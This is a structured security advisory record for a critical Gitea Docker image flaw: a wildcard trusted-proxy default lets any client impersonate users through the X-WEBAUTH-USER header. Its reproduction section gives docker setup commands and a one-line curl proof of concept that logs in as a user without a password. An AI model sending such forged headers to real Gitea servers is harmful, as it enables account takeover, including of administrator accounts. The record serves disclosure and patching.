@@ -1,0 +1,101 @@
+advisory_id: GHSA-f75j-4cw6-rmx4
+datasource_id: github_osv/GHSA-f75j-4cw6-rmx4
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-f75j-4cw6-rmx4/GHSA-f75j-4cw6-rmx4.json
+aliases:
+  - CVE-2026-20896
+summary: |
+  Gitea Docker image: `REVERSE_PROXY_TRUSTED_PROXIES = *` default lets any source IP impersonate any user via `X-WEBAUTH-USER`
+  # Summary
+
+  The Gitea Docker images ship an `app.ini` template that hard-codes:
+
+  ```
+  REVERSE_PROXY_TRUSTED_PROXIES = *
+  ```
+
+  The documented default for this setting, in `custom/conf/app.example.ini`, is `127.0.0.0/8,::1/128`, i.e. only loopback is trusted.
+
+  When an admin enables `ENABLE_REVERSE_PROXY_AUTHENTICATION = true` to put Gitea behind an authenticating reverse proxy and leaves the trusted-proxies setting at "the default", they expect only the proxy's loopback connection to inject identity. The Docker image instead trusts `X-WEBAUTH-USER` from **any source IP** that can reach the container.
+
+  ## Affected
+
+  - `gitea/gitea` Docker images (verified `1.26.2`)
+  - `docker/root/etc/templates/app.ini:55`
+  - `docker/rootless/etc/templates/app.ini:52`
+
+  Binary distribution and self-built deployments that follow `app.example.ini` get the loopback-only default and are not affected.
+
+  ## Reproduction
+
+  ```
+  docker run -d --name g -p 3000:3000 \
+    -e GITEA__service__ENABLE_REVERSE_PROXY_AUTHENTICATION=true \
+    -e GITEA__security__INSTALL_LOCK=true \
+    gitea/gitea:1.26.2
+
+  sleep 15
+  docker exec --user git g gitea admin user create \
+    --username alice --password "longpasswordhere1234" \
+    --email alice@x.test --must-change-password=false
+
+  Now the attack::
+
+
+  curl -s -L -H "X-WEBAUTH-USER: alice" http://localhost:3000/ \
+    | grep -oE '<title>[^<]+</title>'
+  ```
+
+  Output: `<title>alice - Dashboard - Gitea: Git with a cup of tea</title>` — attacker is logged in as alice with one header, no password, no cookie.
+
+  Same payload with `X-WEBAUTH-USER: <any_existing_username>` impersonates that user.
+
+  ## Impact
+
+  Any process that can reach the Gitea container's HTTP port directly — not through the intended authenticating proxy — can impersonate any user whose login name is known or guessable. Admin accounts (`admin`, `gitea_admin`, etc.) are the obvious targets.
+impacted_packages:
+  - purl: pkg:github/go-gitea/gitea
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/go-gitea/gitea
+        commit: 99f8b3d9a1d32f4c39828e07971455a18191e0b9
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-f75j-4cw6-rmx4/GHSA-f75j-4cw6-rmx4.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-284
+references:
+  - url: https://blog.gitea.com/release-of-1.26.3-and-1.26.4
+    reference_type:
+    reference_id:
+  - url: https://github.com/go-gitea/gitea
+    reference_type:
+    reference_id:
+  - url: https://github.com/go-gitea/gitea/commit/99f8b3d9a1d32f4c39828e07971455a18191e0b9
+    reference_type:
+    reference_id:
+  - url: https://github.com/go-gitea/gitea/pull/38151
+    reference_type: other
+    reference_id: 38151
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-20896
+    reference_type:
+    reference_id: CVE-2026-20896
+  - url: https://github.com/go-gitea/gitea/security/advisories/GHSA-f75j-4cw6-rmx4
+    reference_type: advisory
+    reference_id: GHSA-f75j-4cw6-rmx4
+  - url: https://github.com/go-gitea/gitea/releases/tag/v1.26.3
+    reference_type: other
+    reference_id: v1.26.3
+exploits: []
